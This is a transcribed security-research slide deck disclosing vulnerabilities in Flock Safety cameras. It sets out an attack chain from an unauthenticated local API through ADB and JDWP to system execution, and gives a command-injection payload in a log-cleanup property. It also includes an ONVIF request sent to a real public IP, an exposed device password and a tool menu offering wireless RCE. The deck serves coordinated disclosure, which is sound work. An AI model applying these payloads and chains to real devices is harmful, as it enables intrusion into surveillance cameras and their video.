- **vehicles** (car, bus, truck, trailer) → **plates** (licensePlate label) → **people** (person plus other object classes)
- ↓
- **Offline Replay With BirdEye** — Extracted OEM model metadata can be replayed against video, frames, webcam input, or mounted media sessions.

Confirmed: actual TFLite model files and label maps are present locally. | Confirmed: on-device ML decisions affect detectionProcessed output.

APK assets: `/system/app/flock-object/flock-object.apk!/assets/flock_models/` | Runtime cache: `/data/user/0/com.flocksafety.android.objects/cache/flock_models/`

## Slide 21

**Encryption And Media Handling: Observed Gaps**

### 1. Shared Recording Path — *APK static trace*
`MediaFileUtil$mediaPartition$2.smali:81,83,116` · `Flock-Sumarize/media-storage:3-43`

This shows the reviewed app used shared external storage for media paths, with local proof using list/pull/play from `/storage/emulated/0/flockMedia/media`.

```text
.method public final invoke()Ljava/io/File;
    const-string v0, "flockMedia"
    invoke-static {v0},
      Landroid/os/Environment;->
      getExternalStoragePublicDirectory(...)

DIR_FLOCK_MEDIA = "flockMedia"

adb shell ls -R \
  /storage/emulated/0/flockMedia/media
adb pull .../clip.mp4
```

### 2. Falcon/Sparrow Virtual Store — *Falcon/Sparrow storage*
`generic/media:7-16,29` · `falcon/logcat:3741,3851-3869; dumpstate-output:57369`

This shows the Falcon/Sparrow virtual media store key existed beside virtual_disk on the tested unit, and Android mounted the matching private volume.

```text
msm8953_32:/media # ls
0
  expand_426956d8e36644bbb6bcd706b41b737a.key
  lost+found
  virtual_disk

vold: PART 2 ... 426956D8...737A android_expand
vold: Found key for GUID 426956d8...737a
Cryptfs: /dev/block/vold/private:7,2
[persist.sys.virtual_disk]: [true]
```

### 3. Picard/Bravo Media Partition — *Picard/Bravo runtime*
`picard-computebox/mount:63-65` · `logcat-2:28791-28806,31828-31837`

This shows Picard/Bravo media lived on `/media/ufs`, a separate ext4 media partition outside the /data inlinecrypt mount.

```text
mount:
  /dev/block/sda11 on /media/ufs type ext4
    context=u:object_r:flock_media_file:s0
  /dev/block/dm-10 on /data type f2fs
    ... inlinecrypt ...

MediaFileUtil runtime:
  /media/ufs/media/capturing
  /media/ufs/media/captured
  /media/ufs/media/motionProcessed
  /media/ufs/media/detectionProcessed
  /media/ufs/media/encoded
  permission includes OTHERS_READ + GROUP_WRITE
```

### 4. DataLog Cleanup + SELinux — *SELinux boundary*
`SystemControlService.smali:817,831,952` · `inits-in-etc-init-as-root:2-11; whitepaper text:493-497,3609-3614`

This shows a retention setting flowed into a root-run cleanup script; SELinux blocked the root-command path by default.

```text
SystemControlService:
  getSetting("dataLogsRetentionPeriodDays", "5")
  set("persist.vendor.flock.data.logs.retention_period_days", value)
  set("flock.clean_data_partition", "1")

init service:
  clean-data-partition -> /vendor/bin/clean_data_partition.sh
  seclabel u:r:init:s0
  property trigger: flock.clean_data_partition=1

script sink:
  find /data/anr -mtime +$logs_retention_in_days -delete
```

## Slide 22

**SpeedPourer**

PROPOSAL E.1 REVIEW DECK

### 1. Local Services — *forwarded ports*
`video-stack.md:443-477` · `speedpourer logs: 1718-1738`

SpeedPourer defined forwarding rules for the camera portal and RTSP service, bridging wireless interfaces to the camera-side network.

```text
cameraPortal{interface}
  from wlan0:8081
  to 192.168.0.100:80

rtsp{interface}
  from wlan0:8082
  to 192.168.0.100:554

TcpForwarder:
  Starting forwarding server
  fromInterface: wlan0
  fromPort: 8081 / 8082
```

### 2. SpeedPourer Control Plane — *system service*
`speedpourer-latest.log:2-12` · `video-stack.md:507-519,597-602`

Flow: **BOOT_COMPLETED** → SpeedPourerService auto-starts → **Port + Tunnel Config** (files/*.ini + frp_lock) → **frpc** (/system/bin/frpc or lib/arm64-v8a/frpc)

```text
SpeedPourerService:
  Auto-starting service due to BOOT_COMPLETED
  Starting service. Version: 7.38.3
  Successfully processed 2 port(s)
  Successfully processed 0 tunnel(s)

FRP config location:
  /data/user/0/com.flocksafety.android.speedpourer/files/*.ini
Lock file:
  /data/user/0/com.flocksafety.android.speedpourer/files/frp_lock
```

### 3. FRP Config Proof (frpc.ini) — *frpc.ini*
`frpsc-configs.txt:1-16` · `for-cert:60-73`

A lab FRP server and on-device frpc.ini showed the same control point: server address, token, local target, and public remote port.

```text
BRAVO:/data/user/0/.../speedpourer/files # cat frpc.ini
[common]
server_addr = <PUBLIC_IP>
server_port = 7000
token = testtoken

[web-tcp]
type = tcp
local_ip = 127.0.0.1
local_port = 8000
remote_port = 18080
```

### Cleartext Fallback — *CWE-319*
When FRP is unavailable, the documented fallback path uses a static LAN profile and cleartext RTSP/HTTP behavior instead of a protected transport boundary.

Proof: `for-cert:1-24` · `usesCleartextTraffic=true; SpeedPourer assets/ipconfig.txt; 192.168.0.0/24 profile`

### Writable Tunnel Config — *CWE-732*
The tunnel trust boundary collapsed into a local config file: with system context, frpc.ini could be rewritten to alter the remote endpoint and tunnel mapping.

Proof: `for-cert:26-39` · `/data/user/0/com.flocksafety.android.speedpourer/files/frpc.ini; system:system; default 770/660 noted in disclosure`

### Remote Exposure Pivot — *CWE-284*
Repointing FRP could bridge local Camera Config/admin surfaces through a public FRP server, including video/admin handlers listed in the disclosure package.

Proof: `for-cert:41-73` · `/system/bin/frpc; Camera Config listener on 0.0.0.0:8000; /videoAdmin, /getVideo, /deleteVideo, /LAPI/...`

**Disclosure Route** — CERT / CISA VULS path recorded in meeting notes.

**What Was Sent** — New post-whitepaper CVE draft batch covering cleartext transport, FRP config access control, and embedded FRP reverse-proxy exposure.

**Source** — `Meeting-Notes:5,13-17` · `for-cert:1-73` · `new_cve_submission-drafts.md:1-79`

## Slide 23

**Check In**

### Has Flock Ever Had a Data Breach?

No, Flock Safety's cloud platform has never experienced a data breach, and no customer data has ever been compromised.

**Garrett Langley** · 7mo

Security is never “done.” It’s a commitment - and at Flock, it’s one we invest in every day.

Here’s the ground truth on our security posture:

- The Flock system has not been hacked. We secure customer data to the highest standard of industry requirements, including strict industry standard encryption. Flock’s cloud storage has never been compromised.
- When we are made aware of vulnerabilities, even when they are immaterial, we actively report them ourselves, and develop a mitigation plan. Many of the recent claims have already been addressed by our security and engineering teams.

**Wade Hibbard** · 6mo

Oh really? Just two questions.
Are you still using Android 8 to run cameras?
If MFA is enforced by default, then how were people able to access admin panels with no authentication?

*(Attached screenshot: "flock safety" stream viewer showing camera ID 2507089002D, "Hls Stream" / "File Content" buttons, a video of a person walking a path timestamped 12/13/2025 17:24:27, and a buffering/fragment debug log below the player.)*

### Addressing Security Research Transparently

On November 5, 2025, an independent security researcher published a white paper that compiled previously disclosed security findings related to Flock’s hardware and software.

Here’s what’s important to understand:

- The researcher worked with Flock throughout the study and disclosed the findings to us earlier in 2025.
- Flock issued a customer advisory, registered relevant vulnerabilities with the National Vulnerability CVE database via MITRE, and publicly disclosed information in line with industry best practices.
- The report did not identify any breach, compromise of customer data, or real-world exploitation.

*(The remainder of this box is partially covered by the browser screenshot overlapping it below; the visible fragments read:)* "...[vulnerabilitie]s described were highly technical and would have required physical ...detailed knowledge of its internal hardware. No vulnerability affected ...[Floc]k systems, and no customer action was required." / "...vulnerabilities, even when they are immaterial, we actively report them ... [mitig]ation plan,' said Langley." / "...[strengthe]n[s] technology when it is handled transparently. Flock ...engages with researchers in good faith to improve our systems over time."

Browser screenshot — `www.flocksafety.com/blog/update-on-limited-condor-device-configuration-issue`

Flock | Products Solutions Privacy & Security Resources Company

We recently identified and resolved a limited configuration issue affecting a very small number of Condor video devices. No LPR devices, audio devices, or trailers were impacted.

The issue involved a troubleshooting-only debug interface that was temporarily accessible on the internet. This interface does not allow camera control, cloud access, customer account access, or use of search or analytics features. The only content visible was live or recorded video comparable to what can be observed from a public roadway.

The small subset of impacted customers was notified directly. The issue was promptly corrected, and security updates were deployed across affected devices. No sensitive or confidential information was accessed or accessible.

While recent third-party coverage characterized the issue as more extensive, this was an isolated configuration issue and not indicative of a broader or ongoing concern.

## Slide 24

**Live Video Feeds Exposure**

Video player screenshot: date selector "2025-12-13", "flock safety" logo, timestamp "12/13/2025 17:30:47" overlaid on a video of a man pointing at the camera and holding papers, a large red banner reading "NO PASSWORD REQUIRED", playback bar showing duration "11:06". Below: "This Flock Camera Leak is like Netflix For Stalkers" — Benn Jordan and 404 Media — 1.3M views • 6 months ago.

News article screenshot: "Flock Exposed Its AI-Powered Cameras to the Internet. We Tracked Ourselves" — JASON KOEBLER · DEC 22, 2025 AT 11:05 AM. Side text: "Flock left at least 60 of its people-tracking Condor PTZ cameras live streaming and exposed to the open internet." Below the headline, a traffic-camera screenshot of a road intersection with a crosswalk, a pedestrian, a pickup truck, and a street sign reading "Harris".

Grayscale camera-viewer screenshot: purple "flock safety" header, camera ID "250224Q021004DM", "Hls Stream" / "File Content" buttons, timestamp "12/11/2025 06:25:59", showing a house and driveway with two parked cars.

Photo of a camera/sensor module mounted on a pole next to a red-and-white surveying marker, timestamped "11/15/2025 16:00:28".

## Slide 25

## **Turning 3-4 feeds into 67**

##### **PROPOSAL E.1 REVIEW DECK**

1. **Seed Lead** — Benn shared a small set of live examples; one cleartext HTTP URL on an uncommon port proved the exposure was real. *(writeup 116-123)*
2. **Fingerprint** — Extract stable traits from the examples: exposed admin UI, live-view marker, service behavior, carrier/ASN pattern, and stack clues from logs. *(writeup 128-136, 310-316)*
3. **Expand Candidates** — Use passive indexes first, then scoped checks around adjacent network neighborhoods and relevant service ports to build candidate lists. *(writeup 316-326)*
4. **Validate Non-Invasively** — Confirm liveness using a page marker and screenshots/log evidence; avoid control actions, deletion paths, or changing device state. *(check.sh 8-12)*
5. **Deduplicate + Enrich** — Collapse duplicates, count confirmed live instances, add rough ASN/geolocation context, and package findings for responsible handling. *(writeup 326-328, 347)*

### What Changed

- **3-4** — initial examples Benn found — seed set, not final scope
- **15-ish** — live instances from passive expansion — Shodan / ZoomEye phase
- **67** — confirmed live camera feeds — final confirmed list

### Safety Boundaries

The important technical story is not the exact query. It is the workflow: derive a fingerprint from real examples, expand with low-touch OSINT, validate only enough to prove exposure, then stop and preserve evidence.

- **No control-plane actions** — No delete paths, reboot paths, credential changes, PTZ movement, or device-state changes were needed to count exposure.
- **Evidence over interaction** — Use visible markers, response shape, screenshots, logs, and metadata to classify exposed systems without operating the cameras.
- **Correlation, then restraint** — Carrier/ASN and geolocation helped understand scope, but exact physical locations belong in disclosure handling, not slide copy.
- **Keep raw target data off slides** — Show counts and process. Keep IPs, paths, and queries in private evidence bundles or redacted appendices.

**Local Sources** — exposed-feeds-writeup:116-136,310-328,347 · lproper-full-list.txt: 67 confirmed lines

**Validation Artifacts** — check.sh: marker confirmation · leak/8900/*: candidate, checked, geo, final lists

## Slide 26

**Exposed Feeds**

Four camera-configuration editor entries (white form UI), each with a Save button:

| Camera | Serial | Type | DeviceType | IP | Port | User | Pass | Stream type | Stream path | Stream port |
|---|---|---|---|---|---|---|---|---|---|---|
| f1fbfd82-dfc1-40... *(cut off)* | 241219Q0210024Y | falcon | picardCamera | 192.168.0.100 *(cut off)* | 554 | admin | *(empty)* | proxy | / | 9554 |
| 46e05334-15ce-... *(cut off)* | 241219Q02100230 | falcon | picardCamera | 192.168.0.100 *(cut off)* | 554 | admin | *(empty)* | proxy | / | 9554 |
| f0bf45fa-86fd-40... *(cut off)* | 250625900FF | condor | accessoryCamera | 192.168.0.100 *(cut off)* | 554 | admin | `0M8?4FBQ6rHHyBLR5Ri=` | replay | 250625900FF-replay | 8554 |
| 62c8e21c-99ab-... *(cut off)* | 240826Q021003AF | falconHighway | picardCamera | *(empty)* | 554 | admin | *(empty)* | replay | 240826Q021003AF-r... *(cut off)* | 8554 |

Each entry also has empty "+ Add channel" / "+ Add stream" controls and a stream channel field reading "one" with a remove (×) button.

A separate "flock safety" viewer panel (purple header) shows camera ID 250121Q02101953 in the sidebar and as the page heading, with "Hls Stream" / "File Content" tab buttons, a night-time parking-lot video preview, an "HLS.js Logs" panel beside it (text illegible even at maximum zoom), and a data table below with columns cameraId, codec, durationMsec, fileSize, filename, height, id, path, startTs, width, Action. The table has at least 5 rows, each ending in a green "Play" button; the individual cell values (hashes, byte counts, timestamps, paths) are too small and blurred in the source to transcribe reliably even at maximum zoom — do not trust any specific digit from this table.

## Slide 27

**Exposed Feeds: Impact And Evidence**

### Reachable Surface

- **Live Video** *(HLS / RTSP)* — Camera feeds and stream viewers exposed live video paths and stream state.
- **Historical Media** *(record / replay)* — Stored or replay-capable media paths appeared through admin UI and ONVIF recording/replay capability output.
- **Admin Actions** *(delete / archive)* — Video admin flows exposed management controls including video deletion/archive-style actions in the stack.
- **Logs + Diagnostics** *(crashpack)* — Diagnostics revealed package names, media pipeline state, modem/battery state, ADB debug state, and crashpack contents.
- **Video Settings** *(codec / path)* — Encoding output disclosed HEVC/H265 settings, resolution, frame rate, media paths, and asset pipeline behavior.
- **Device Types** *(not one class)* — Evidence crossed PTZ/Condor-style views, Falcon/Sparrow/Flex-style LPR feeds, and Picard/Bravo video-stack context.

This was exposed edge infrastructure, not only exposed video. The proof came from the same reachable surfaces: screenshots, HLS clips, admin UI captures, ONVIF capability output, RTSP/session logs, and crashpack/log artifacts.

**Visual Artifacts** — Camera feed captures, logs/diagnostic screenshots, no-password and disclosed-password screenshots, admin interface clips, and converted MP4 demo assets.

### Publicly Documented Scope

- **67** confirmed exposed feeds / debug interfaces — expanded from Benn / 404 seed examples
- **19** cities — public writeup scope statistic
- **15** states — public writeup scope statistic
- **AS6167** Verizon Business — all 67 observed on this ASN

No data changing action was performed during validation.

## Slide 28

**Exposed Feeds: Why It Happened**

Photo: an empty store parking lot at night, timestamped 11/09/2025 21:36:04.

Failure pattern: local network reachability was treated like authorization.

```text
POST /onvif/device_service HTTP/1.1
Host: 72.111.221.111:8000
User-Agent: curl/8.7.1
Accept: */*
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 216
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="
http://www.w3.org/2003/05/soap-envelope">
  <s:Body>
    <tds:GetCapabilities xmlns:tds="
    http://www.onvif.org/ver10/device/wsdl"/>
  </s:Body>
</s:Envelope>
```

```text
HTTP/1.1 200 OK
Server: Happytime onvif server V10.3
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 7022
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="
http://www.w3.org/2003/05/soap-envelope"
xmlns:e="http://www.w3.org/2003/05/soap-encoding"
xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:xs="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:wsaw="http://www.w3.org/2006/05/addressing/wsdl"

xmlns:wsnt="http://docs.oasis-open.org/wsn/b-2"
xmlns:wstop="http://docs.oasis-open.org/wsn/t-1"
xmlns:wsntw="http://docs.oasis-open.org/wsn/bw-2"
xmlns:wsrf-rw="http://docs.oasis-open.org/wsrf/rw-2"
xmlns:wsrf-r="http://docs.oasis-open.org/wsrf/r-2"
xmlns:wsrf-bf="http://docs.oasis-open.org/wsrf/bf-2"
xmlns:wsdl="http://schemas.xmlsoap.org/wsdl"
xmlns:wsoap12="http://schemas.xmlsoap.org/wsdl/soap12"
```
(code panel is cut off at the bottom edge of the slide)

## Slide 29

**Gated Wireless And Local Shell**

### Attack Chain Flow

1. **Trigger Local Network** — Device enters a mode where a Flock-named local wireless network becomes reachable from nearby range. *(proximity boundary)*
2. **Join Device Network** — Shared/default wireless credential behavior moves the attacker from physical proximity into the device LAN/WLAN trust zone. *(shared credential)*
3. **Reach Collins API** — Collins exposes local administrative endpoints without authentication, including status, logs, crashpack, reboot, and ADB-enable surfaces. *(CVE-2025-59403)*
4. **Enable ADB Over TCP** — The unauthenticated local API can transition the device from "ADB closed" to a network-reachable ADB state. *(control transition)*
5. **Shell Access** — Once ADB is reachable over the local network, the chain reaches a shell on the camera device; adjacent JDWP/system paths can deepen impact. *(local RCE / shell)*

**Why the chain mattered** — The security boundary was not just "is the device physically mounted high enough?" Local wireless access became administrative API access.

**What CVE-2025-59403 covers** — The Collins application lacked authentication on local administrative API endpoints and exposed actions capable of enabling ADB-over-TCP.

## Slide 30

**ADB / JDWP / Privilege Chain: Compress It**

### Attack Chain Flow

6. **ADB Shell** — After ADB-over-TCP is enabled, command execution starts in Android shell context. *(uid=2000(shell))*
7. **Shell Injection** — By default, command injection from this position is shell-level: useful control, but not root by itself. *(u:r:shell:s0)*
8. **JDWP Attach** — Privileged Flock apps shipped debuggable, so JDWP attaches to the app process rather than staying inside shell. *(debuggable system app)*
9. **System Execution** — Because the target app runs as a privileged system process, JDWP execution lands as Android system. *(uid=1000(system))*
10. **Root Maintenance Path** — System context can set the cleanup property consumed by init-owned maintenance logic. *(init/root service path)*
11. **SELinux Boundary** — The root command-injection path is present, but SELinux blocked the root execution outcome on the tested build. *(containment observed)*

### Privileged App Conditions

- `android:debuggable=true`
- `android.uid.system` / privileged app context
- JDWP active when ADB is available
- Runtime execution observed as `uid=1000(system)`

### Observed Boundary

- ADB command execution: shell context
- JDWP command execution: system context
- Root command-injection primitive: maintenance path
- SELinux blocked the root execution outcome on the tested build

### Privilege Map

- **shell** — Default ADB command execution position.
- **system** — JDWP inside debuggable privileged Flock app.
- **root** — Init-owned cleanup service and property-driven script path.
- **SELinux** — Containment layer that blocked the root outcome in testing.

### Why JDWP Changes the Context

JDWP executes inside the selected app process. When that process is a debuggable privileged system app, runtime execution inherits the system app context.

### Data Cleanup Payload

```text
var: persist.vendor.flock.data.logs.max_size_mb
payload: 1 ]]; /system/bin/id > /data/local/tmp/flock_root #
trigger: flock.clean_data_partition=1
```

## Slide 31

### **Improper Entitlement Authorization for Protected Artifact Access - Manufacturer Entitlement Pivot (MEP)**

#### **_Flea Market Supply Chain Attack_**

Three overlapping email screenshots, most sender/recipient names and identifying details redacted (blacked out) by the presenter:

Email 1: "Your request [REDACTED] has been updated. Current status: Pending. To review the status of the request and add additional comments, follow the link below: https://tickets.[REDACTED]. You can also add a comment by replying to this email." Followed by a redacted signature block, then: "Thank you for picture. This Open-Q 624A SOM was sold to other company. Can you tell us from which company you bought this SOM? Thank you! Best regards," *(cut off at bottom of slide)*

Email 2 (top right, a vendor "Techportal" support thread): "Hello [REDACTED]. Thank you for registering on our Techportal. I can not find the SN 313[REDACTED]9 in our system. Can you please send us the picture of device label or order number at [REDACTED]. Thank you! Best regards, [REDACTED]" — sender address shown as "[REDACTED]@gainsecmail.com" — quoted below: "SN 31[REDACTED]9" / a standard confidentiality footer ("This e-mail is the property of [REDACTED], is intended only for the person or entity to which it is addressed and may contain information that ... to anyone other than the intended recipient is prohibited.") / "..." / "[REDACTED] - tickets a[REDACTED]" / "to Jay ▾" / "Your request [REDACTED] been updated. Current status: Pending. To review the status of the request and add additional comments, follow the link below: [REDACTED]. You can also add a comment by replying to this email." / "Hello, [REDACTED]. You have now access to the Open-Q 624 SOM on our Techportal. Please let me know if you have more questions. Best regards, [REDACTED]"

Meme image (Toy Story's Woody and Buzz Lightyear): "ONE MAN'S JUNK" / "IS ANOTHER MAN'S TREASURE" — watermarked "imgflip.com".

## Slide 32

## **Community And Third-Party Tools**

- Flock-You - ColonelPanic / colonelpanichacks - ESP32/OUI-SPY firmware for detecting Flock/Raven devices over Wi-Fi/BLE.

- flock-you-wifi-recon - 0xXyc - passive ESP32 Wi-Fi recon focused on Flock ALPR probe/request behavior.

- Flock Sniff - JustCallMeKoko / ESP32Marauder - ESP32Marauder feature for detecting Flock devices with Wi-Fi/BLE sniffing.

- Flock Wardrive - JustCallMeKoko / ESP32Marauder - GPS-tagged Flock detection / wardriving workflow.

- fflock - developer not confirmed - Rust laptop/Raspberry Pi tool for passive BLE + Wi-Fi LPR/Flock detection.

- Flock You OLED - Storby42 - ESP32 OLED variant of Flock-You with on-device display/alerts.

- Pigtail - benbaker76 - anti-stalking/surveillance detector that includes Flock/Raven BLE detection.

- Flock-You ESP32 - simeononsecurity - standard ESP32 build/package for running Flock-You-style detection cheaply.

- FlipDeFlock - ReconGrunt - Flipper Zero app plus ESP32 companion for Flock/ALPR detection and site surveys.

- Flock-You-Android - MaxwellDPS - Android counter-surveillance app with Flock ALPR and other surveillance-device detection.

- What The Flock - WhatIsInCreedmoor - ESP-IDF port/expansion of Flock-You for ESP32 boards.

## Slide 33

**Demo: Recorded RCE**

Video screenshot, left half: a photo of an opened GPS-tracker-style device on a desk with its battery and PCB exposed, next to stickers reading "Support Local Hacker / Show your password" and "No Security No Life" (with a rubber duck), a wristwatch, and a "gainSEC" sticker.

Right half: a terminal window (tab "root@SectorTL: /home/nigel", second tab "pwsh in numbuh1337") running a watch loop:

```text
Every 2.0s: iw dev wlan0 scan | grep SSID:                    SectorTL: Sat Sep 13 02:23:24 2025

    SSID: SectorWG
    SSID: Verizon_CT7M3V
    SSID: Verizon_Q9P6FN
    SSID: Fios-SkCr5
    SSID: Verizon_4PRWM8
    SSID: Verizon_4PRWM8
    SSID: SectorW5
    SSID: SectorI
    SSID: SectorL
    SSID: Verizon_4PRWM8
    SSID: SectorI
    SSID: SectorL
    SSID: SectorW
    SSID: Verizon_CT7M3V
    SSID: Fios-SkCr5
    SSID: Verizon_Q9P6FN
    SSID: SectorN
    SSID: Verizon_Q9P6FN
    SSID: Fios-SkCr5
    SSID: Verizon_Q9P6FN
    SSID: DIRECT-26-HP OfficeJet 8010
    SSID: Verizon_NNR5B9
```

The source is a low-resolution video screenshot; the single-character suffixes on the short "Sector*" SSIDs (e.g. whether "SectorWG" ends in G) are at the edge of legibility even at maximum zoom, so treat those specific trailing characters as approximate.

## Slide 34

## **BirdShot: Why It Exists**

| Phase | Scope | Task |
|---|---|---|
| PRE | All Devices | Inventory devices, firmware, app versions; record hashes |
| PRE | All Devices | Establish SBOM and signed update pipeline (TUF/Uptane-style) |
| PRE | All Devices | Adopt secure configuration baseline (no debug, no sideload, no unauth admin) |
| PRE | All Devices | Legal/ops banners and access policies for service interfaces |
| FIELD | Raven | Enable Secure Boot; enforce anti-rollback |
| FIELD | Raven | Enable flash encryption |
| FIELD | Raven | Disable/lock UART download and JTAG; remove console or gate with auth |
| FIELD | Raven | Remove hardcoded SSIDs; disable auto-connect |
| FIELD | Raven | Enforce TLS server verification / pinning |

Terminal / demo screenshot:

```text
I (674) main_task: Calling app_main()
```

Below that line, the word "GAINSEC" is rendered as a large ASCII-art block-letter banner (box-drawing characters), followed by:

```text
    IT'S BIRD HUNTING SEASON

    Flock Safety Sniffer

    https://gainsec.com

Sending out the bird call and Sniffing...

I (1344) pp: pp rom version: 5b8dcfa
I (1424) net80211: net80211 rom version: 5b8dcfa
```

A "gain SEC" logo image appears beside the banner. Below the terminal, two further screenshots: a dark, grainy object-detection frame with a green bounding box labeled "vehicle 0.41"; and an iTerm2 window ("Bird Hunting Season - BirdEye - By GainSec - Flock LLM") showing a person wearing a beanie at a desk with green bounding boxes labeled "person 0.52" and "person 0.45".

## Slide 35

## **Introducing BirdShot**

Screenshot: captions "Bird Hunting Season" / "Birdshot UI" above a mobile game mockup titled "BIRDSHOT" — a Duck Hunt-style game screen with a cloud, a grass field, an ammo counter, and "SCORE 00100"; "gain SEC" logo below.

https://github.com/GainSec/BirdShot

## Slide 36

**Demo: BirdShot CLI**

```text
=== Command Output ===
Main Menu (Device: Picard)

1. Shared Toolkit Workflow
2. Falcon / Falcon LR Utilities
3. Picard / Avicore Conversions
4. Raven Health Snapshot
5. Penguin Packs
6. Condor Utilities
7. Trap Shooter
8. Collins API
9. JDWP Shell (jdwp_exec)
10. Auto - Wireless RCE
11. Auto - Wireless RCE (System Shell)
Q. Exit
Commands: device (switch), devices (list), add (add offline), jobs (list), scan
(BLE scan)
menu> 9
Connected adb devices:
  1. 241108P02100632 [device]
  2. 192.168.227.119:5555 [device]
Select device by number:
```

## Slide 37

**Landing**

### Picard Battery Internals

- **Internals** — photo of the opened Picard battery pack showing its internal PCB and wiring.
- **Main board marking** — closeup of the board silkscreen: "2024-09-07 Picard Main Board V1.9".
- **Board connector** — closeup of a board-edge connector labeled with pin names (GND, RXD, TXD, etc.).

### Penguin Bluetooth Characteristics

**Device Information** — 7 characteristics. "The Device Information Service exposes manufacturer and/or vendor information about a device."

| Characteristic | Value |
|---|---|
| Model Number | F-PP-0001 |
| Serial Number | TN72022122000290 |
| Firmware Revision | 2.4.0 |
| Hardware Revision | 0001 |
| Software Revision | 2.4.0 |
| Manufacturer Name | Flock Safety |
| Position 3D | 50 |

**Environmental Sensing** — 2 characteristics. "This service exposes measurement data from an environmental sensor intended for sports and fitness applications. A wide range of environmental parameters is supported." Temperature (value shown as `ac0d`), Humidity (no value shown).

Two further custom BLE services are listed below it: `69400001-B5A3-F393-E0A9-E50E24DCCA99` (2 characteristics: `69400002-B5A3-F393-E0A9-E50E24DCCA99`, `69400003-B5A3-F393-E0A9-E50E24DCCA99`), and `E8CCBB38-9532-46A8-9FE5-1814DF172E6F` (2 characteristics: `628913A6-8701-40FF-A3CE-8F453FF08180`, `8818D1D2-FE71-439F-9629-D4B472D13985`, value `0`); then **Secure DFU Service** — 1 characteristic. This panel's text is very small in the source; exact hex digits in the two custom UUIDs' sub-characteristics should be treated as approximate.

**Buttonless DFU without bonds** — `com.nordicsemi.characteristic.dfu.buttonless_experimental_without_bonds`. "No description available." A write panel (String / Number / Hex tabs) shows "Not connected" with a Connect button; a read panel shows "No value available — Characteristic does not support reading."

Panel captions, left to right: Internals, Board connector, Device information service, Buttonless DFU without bonds.

## Slide 38

**Q&A**

| # | Area | Issue |
|---|---|---|
| 1 | Raven | Secure Boot is Disabled |
| 2 | Raven | Debug UART Console Access |
| 3 | Raven | Lack of Password Debug UART Console Access |
| 4 | Raven | Hardcoded Wi-Fi Credentials Auto Connect |
| 5 | Raven | Lack of Flash Encryption |
| 6 | Raven | Debug Interface Accessible: JTAG |
| 7 | Raven | Debug Interface Accessible: UART Download |
| 8 | Raven | No Anti-Rollback Protection |
| 9 | Raven | Audio ML/AI Model Disclosed |
| 10 | Raven | Hardcoded Credentials: API Client Secret |
| 11 | Raven | Lack of Server Verification / DNS Spoofing |
| 12 | Falcon / Sparrow / Flex | Root Shell |
| 13 | Falcon / Sparrow / Flex | Secure Boot is Disabled |
| 14 | Falcon / Sparrow / Flex | Unlocked Bootloader |
| 15 | Falcon / Sparrow / Flex | Lack of Authentication: EDL/QDL Mode |
| 16 | Falcon / Sparrow / Flex | Lack of Authentication: Android Debug Bridge |
| 17 | Falcon / Sparrow / Flex | Improper Access Control: Android Debug Bridge Sideload |
| 18 | Falcon / Sparrow / Flex | Lack of Flash/eMMC Encryption |
| 19 | Falcon / Sparrow / Flex | Use of an Unsupported and End-of-Life Operating System |
| 20 | Falcon / Sparrow / Flex | Sensitive Information Disclosed: Development/Test Credential in Production |
| 21 | Picard / Bravo | Root Shell |
| 22 | Picard / Bravo | Secure Boot is Disabled |
| 23 | Picard / Bravo | Unlocked Bootloader |
| 24 | Picard / Bravo | Lack of Authentication: EDL/QDL Mode |
| 25 | Picard / Bravo | Lack of Authentication: Android Debug Bridge |
| 26 | Picard / Bravo | Improper Access Control: Android Debug Bridge Sideload |
| 27 | Picard / Bravo | Lack of Flash/UFS Encryption |
| 28 | Multi-device | Unauthenticated Administrative API Endpoints |
| 29 | Multi-device | Hidden Hardware Debug Functionality: Hotspot |
| 30 | Multi-device | Wireless Remote Code Execution: System |
| 31 | Media / recordings | Incorrect Default Permissions: Media Recordings Directories |
| 32 | Media / recordings | Shared Media Library Allows Cross-App Data Exposure |
| 33 | Multi-device | Wireless Remote Code Execution: Shell |
| 34 | PhoneHome / debug broadcast | Unauthenticated Debug Broadcast Clears Settings and Shuts Off Device |
| 35 | Android app suite | Multiple Privileged System Apps Shipped with Debugging Enabled |
| 36 | Media / recordings | Lack of Per-File Encryption on Sensitive Media |
| 37 | Android app suite | Sensitive Information Disclosed: Hardcoded Auth0 Secret |
| 38 | Android system service | Root Command Injection via Data Log Cleanup Service |
| 39 | Media / recordings | Excessive Sensitive Media Copies Persist on Disk |
| 40 | Android app suite | Sensitive Information Disclosed: Cleartext API Keys/Credentials |
| 41 | Multi-device | Wireless Remote Code Execution: Root |
| 42 | Android visual recognition stack | ML/AI Local Model Accessible |
| 43 | Android app suite | Sensitive Information Disclosed: Hardcoded Java Keystore and Password |
| 44 | Media / recordings | Data Recording Retention Relies Solely on Disk Capacity |
| 45 | Media / recordings | Records Stored on Unencrypted External Partition |
| 46 | Android app suite | Sensitive Information Disclosed: Datadog API Token |
| 47 | Public / installer app | Cleartext Communications |
| 48 | Public / app-side | Sensitive Information Disclosure: Google API Key |
| 49 | Public / app-side | Plaintext HTTP in Logs |
| 50 | Public / app-side | Sensitive Information Disclosure: API Keys |
| 51 | Public / app-side | Remote Code Execution: System |
| 52 | FS Installer / Penguin | FS Installer sensitive operational artifact disclosure: Raven BLE config, Penguin firmware/bootloader ZIPs, local service URLs, field workflow logic |
| 53 | SpeedPourer / FRP | SpeedPourer/FRP cleartext video/control fallback path |
| 54 | SpeedPourer / FRP | SpeedPourer/FRP config permission/control issue |
| 55 | SpeedPourer / FRP | SpeedPourer/FRP reverse-proxy/admin exposure |

